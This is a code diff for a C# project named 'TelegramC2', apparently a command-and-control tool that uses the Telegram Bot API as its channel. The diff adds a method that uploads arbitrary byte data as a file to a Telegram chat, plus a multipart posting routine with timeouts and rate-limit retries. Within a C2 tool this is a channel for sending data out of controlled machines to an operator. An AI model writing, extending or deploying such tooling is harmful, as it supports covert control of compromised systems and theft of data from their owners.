@@ -1,6 +1,7 @@
 using System.Net;
 using System.Text;
 using System.Text.Json;
+using System.Net.Http.Headers;
 using System.Text.Json.Serialization;
 
 namespace TelegramC2;
@@ -99,6 +100,34 @@ internal sealed class TelegramApiClient : IDisposable
         }
 
         throw new HttpRequestException("Telegram rate limit retries were exhausted.");
+    }
+
+    public async Task SendDocumentAsync(string chatId, byte[] data, string filename, CancellationToken ct)
+    {
+        using var content = new MultipartFormDataContent();
+        var fc = new ByteArrayContent(data);
+        fc.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
+        content.Add(fc, "document", filename);
+        content.Add(new StringContent(chatId), "chat_id");
+        await PostMultipartAsync("sendDocument", content, 30, ct);
+    }
+
+    private async Task PostMultipartAsync(string method, MultipartFormDataContent content, int timeout, CancellationToken ct)
+    {
+        for (int attempt = 0; attempt < 4; attempt++)
+        {
+            using var timeoutCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
+            timeoutCts.CancelAfter(TimeSpan.FromSeconds(timeout));
+            using var resp = await _httpClient.PostAsync(_endpoint + method, content, timeoutCts.Token);
+            string body = await resp.Content.ReadAsStringAsync(timeoutCts.Token);
+            var parsed = JsonSerializer.Deserialize<TelegramApiResponse<JsonElement>>(body, JsonOptions);
+            if ((int)resp.StatusCode == 429 && parsed?.Parameters?.RetryAfter is int retryAfter)
+            { await Task.Delay(TimeSpan.FromSeconds(Math.Clamp(retryAfter, 1, 60)), ct); continue; }
+            if (!resp.IsSuccessStatusCode || parsed?.Ok != true)
+                throw new HttpRequestException(parsed?.Description ?? $"HTTP {(int)resp.StatusCode}");
+            return;
+        }
+        throw new HttpRequestException("sendDocument retries exhausted.");
     }
 
     public void Dispose()
